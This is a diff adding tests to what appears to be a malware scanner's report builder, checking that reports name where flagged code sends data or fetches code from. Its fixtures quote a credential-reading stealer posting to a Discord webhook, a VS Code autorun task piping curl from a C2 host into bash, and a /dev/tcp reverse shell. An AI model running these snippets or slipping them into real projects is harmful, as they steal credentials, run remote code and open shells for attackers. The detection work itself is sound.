@@ -553,3 +553,38 @@ def test_wallet_theft_rule_names_a_cryptostealer():
     assert r["threat_description"].startswith(
         "Infostealer and cryptostealer, exfiltrating to a Discord webhook (a2.py:4)")
     assert "- a2.py:9: reads crypto wallet stores" in r["payload_description"]
+
+
+def test_report_names_the_outbound_channel():
+    # Egress schema: the report says where the data or code goes, source -> sink.
+    stealer = build_report(_row(raw_payload=json.dumps({"bash_findings": [
+        {"file": "src/main/java/me/x/Grabber.java", "line": 40,
+         "category": "credential_access", "rule": "mc-launcher-accounts",
+         "snippet": 'new File(home, ".minecraft/launcher_accounts.json")'},
+        {"file": "src/main/java/me/x/Grabber.java", "line": 52,
+         "category": "network_exfil", "rule": "discord-webhook",
+         "snippet": 'post("https://discord.com/api/webhooks/123/abc", data)'}]})))
+    assert ("Outbound: exfil. It reads credentials (src/main/java/me/x/Grabber.java:40) "
+            "and sends data out (src/main/java/me/x/Grabber.java:52)."
+            in stealer["threat_description"])
+    assert "- Outbound: exfil." in stealer["payload_description"]
+
+    dropper = build_report(_row(raw_payload=json.dumps({"bash_findings": [
+        {"file": ".vscode/tasks.json", "line": 5, "category": "install_hook",
+         "rule": "vscode-autorun",
+         "snippet": "curl https://x-c2.vercel.app/a | bash"}]})))
+    assert ("Outbound: fetch-and-run. It downloads code from x-c2.vercel.app"
+            in dropper["threat_description"])
+
+
+def test_stored_egress_wins_over_reclassification():
+    r = build_report(_row(raw_payload=json.dumps({
+        "egress": "c2",
+        "egress_findings": [{"file": "run.sh", "line": 3, "category": "reverse_shell",
+                             "rule": "bash-dev-tcp",
+                             "snippet": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}],
+        "bash_findings": [{"file": "run.sh", "line": 3, "category": "reverse_shell",
+                           "rule": "bash-dev-tcp",
+                           "snippet": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}]})))
+    assert "Outbound: C2. It opens a remote shell to" in r["threat_description"]
+    assert "(run.sh:3)" in r["threat_description"]
